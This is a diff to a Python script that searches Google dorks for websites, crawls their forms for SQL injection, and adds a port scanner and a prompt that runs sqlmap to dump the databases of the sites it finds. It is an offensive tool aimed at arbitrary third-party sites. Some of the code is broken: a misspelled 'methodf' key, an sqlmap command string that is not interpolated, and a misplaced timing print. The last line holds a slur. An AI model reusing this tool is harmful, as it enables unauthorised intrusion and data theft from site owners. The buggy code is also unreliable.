@@ -7,6 +7,7 @@ import requests
 from bs4 import BeautifulSoup as bs
 from urllib.parse import urljoin
 from pprint import pprint
+from socket import *
 
 #Slow print for things
 def print_slow(str):
@@ -15,6 +16,8 @@ def print_slow(str):
         sys.stdout.flush()
         time.sleep(0.1)
 
+#Ping needs
+startTime = time.time()
 
 #Crawling needs
 s = requests.Session()
@@ -31,51 +34,18 @@ def cls():
   os.system('clear')
 
 #Loading function
-def loader():
-  for i in range(1):
-    cls()
-    print("Loading")
-    time.sleep(delay)
-    cls()
-    print("lOading.")
-    time.sleep(delay)
-    cls()
-    print("loAding..")
-    time.sleep(delay)
-    cls()
-    print("loaDing...")
-    time.sleep(delay)
-    cls()
-    print("loadIng....")
-    time.sleep(delay)
-    cls()
-    print("loadiNg.....")
-    time.sleep(delay)
-    cls()
-    print("loadinG......")
-    time.sleep(delay)
-    cls()
-    print("Loading.......")
-    time.sleep(delay)
-    cls()
-    print("lOading........")
-    time.sleep(delay)
-    cls()
-    print("loAding.........")
-    time.sleep(delay)
-    cls()
-    print("loaDing..........")
-    time.sleep(delay)
-    cls()
-    print("loadIng..........")
-    time.sleep(delay)
-    cls()
-    print("loadiNg..........")
-    time.sleep(delay)
-    cls()
-    print("loadinG..........")
-    time.sleep(delay)
-    cls()
+
+def ping():
+  target = args.ping
+  t_IP = gethostbyname(target)
+  print ('Starting scan on host: ', t_IP)
+  for i in range(50, 500):
+     s = socket(AF_INET, SOCK_STREAM)
+     conn = s.connect_ex((t_IP, i))
+     if(conn == 0) :
+       print ('Port %d: OPEN' % (i,))
+       s.close()
+       print('Time taken:', time.time() - startTime)
 
 def get_all_forms(url):
     """Given a `url`, it returns all forms from the HTML content"""
@@ -165,7 +135,7 @@ def scan_sql_injection(url):
             url = urljoin(url, form_details["action"])
             if form_details["method"] == "post":
                 res = s.post(url, data=data)
-            elif form_details["method"] == "get":
+            elif form_details["methodf"] == "get":
                 res = s.get(url, params=data)
             # test whether the resulting page is vulnerable
             if is_vulnerable(res):
@@ -178,7 +148,29 @@ def scan_sql_injection(url):
 #Text User Interface
 def tui():
   os.system('clear')
-  print("[1] Use dork once\n[2] Use multiple dorks")
+  print("""                ,-,
+                                                             _.-=;~ /_
+                                                          _-~   '     ;.
+                                                      _.-~     '   .-~-~`-._
+                                                _.--~~:.             --.____88
+                              ____.........--~~~. .' .  .        _..-------~~
+                     _..--~~~~               .' .'             ,'
+                 _.-~                        .       .     ` ,'
+               .'                                    :.    ./
+             .:     ,/          `                   ::.   ,'
+           .:'     ,(            ;.                ::. ,-'
+          .'     ./'.`.     . . /:::._______.... _/:.o/
+         /     ./'. . .)  . _.,'               `88;?88|
+       ,'  . .,/'._,-~ /_.o8P'                  88P ?8b
+    _,'' . .,/',-~    d888P'                    88'  88|
+ _.'~  . .,:oP'        ?88b              _..--- 88.--'8b.--..__
+:     ...' 88o __,------.88o ...__..._.=~- .    `~~   `~~      ~-._      _.
+`.;;;:='    ~~            ~~~                ~-    -       -   -""")
+  print("""
+  --------------------------
+  | [1] Use dork once      |
+  | [2] Use multiple dorks |
+  --------------------------""")
   while True:
     option = input("_> ")
     if option =='1':
@@ -211,9 +203,16 @@ def dictionary():
     for j in search(query):
       print(Fore.GREEN + '{}'.format(j))
       print(Fore.LIGHTYELLOW_EX + "--------------------------------")
-    if args.crawl:
-      print("Starting to crawl!")
-      scan_sql_injection(j)
+      if args.crawl:
+        print("Starting to crawl!")
+        scan_sql_injection(j)
+
+    yur = input("Do you want to dump the database via sqlmap? ")
+    if yur =='yes':
+        os.system('sqlmap {j} --dump --dbs')
+    else:
+        sys.exit('Bye')
+    
     
     
 #Arguments
@@ -233,12 +232,57 @@ parser.add_argument('-c', '--crawl',
 action='store_true',
 help='Run the crawler to check for sqli')
 
+#Pings the select host.
+parser.add_argument('-p', '--ping',
+help='Pings the select host to see if it is alive')
+
 args = parser.parse_args()
 #Detect correct args
 if args.dictionary:
-    loader()
+    cls()
+    print("""                ,-,
+                                                             _.-=;~ /_
+                                                          _-~   '     ;.
+                                                      _.-~     '   .-~-~`-._
+                                                _.--~~:.             --.____88
+                              ____.........--~~~. .' .  .        _..-------~~
+                     _..--~~~~               .' .'             ,'
+                 _.-~                        .       .     ` ,'
+               .'                                    :.    ./
+             .:     ,/          `                   ::.   ,'
+           .:'     ,(            ;.                ::. ,-'
+          .'     ./'.`.     . . /:::._______.... _/:.o/
+         /     ./'. . .)  . _.,'               `88;?88|
+       ,'  . .,/'._,-~ /_.o8P'                  88P ?8b
+    _,'' . .,/',-~    d888P'                    88'  88|
+ _.'~  . .,:oP'        ?88b              _..--- 88.--'8b.--..__
+:     ...' 88o __,------.88o ...__..._.=~- .    `~~   `~~      ~-._      _.
+`.;;;:='    ~~            ~~~                ~-    -       -   -""")
     dictionary()
 
 if args.interact:
-  loader()
+  cls()
+  print("""                ,-,
+                                                             _.-=;~ /_
+                                                          _-~   '     ;.
+                                                      _.-~     '   .-~-~`-._
+                                                _.--~~:.             --.____88
+                              ____.........--~~~. .' .  .        _..-------~~
+                     _..--~~~~               .' .'             ,'
+                 _.-~                        .       .     ` ,'
+               .'                                    :.    ./
+             .:     ,/          `                   ::.   ,'
+           .:'     ,(            ;.                ::. ,-'
+          .'     ./'.`.     . . /:::._______.... _/:.o/
+         /     ./'. . .)  . _.,'               `88;?88|
+       ,'  . .,/'._,-~ /_.o8P'                  88P ?8b
+    _,'' . .,/',-~    d888P'                    88'  88|
+ _.'~  . .,:oP'        ?88b              _..--- 88.--'8b.--..__
+:     ...' 88o __,------.88o ...__..._.=~- .    `~~   `~~      ~-._     _.
+`.;;;:='    ~~            ~~~                ~-    -       -   -""")
   tui()
+
+if args.ping:
+  cls()
+  ping()
+print("Needs arguments you retard")
